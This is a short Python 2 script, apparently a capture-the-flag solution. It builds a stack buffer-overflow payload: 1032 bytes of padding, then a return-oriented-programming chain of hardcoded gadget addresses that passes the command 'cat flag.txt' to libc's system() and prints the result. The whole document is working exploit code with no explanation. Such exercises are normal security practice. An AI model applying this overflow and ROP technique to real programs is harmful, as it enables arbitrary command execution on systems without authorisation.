import struct

system_addr = 0x7ffff7a53390
ret_addr = 0x4005e2
g1 = 0x4006d3
g2 = 0x4006d0
g3 = 0x4006d1


payload = 1032*'A' + struct.pack('<Q',g3) +struct.pack('<Q',0x1) +struct.pack("<Q",g1) + "cat flag.txt" + "\x00"*4 + struct.pack("<Q",g2) + struct.pack("<Q",g3) + 'A'*8 + struct.pack("<Q",system_addr)
print payload

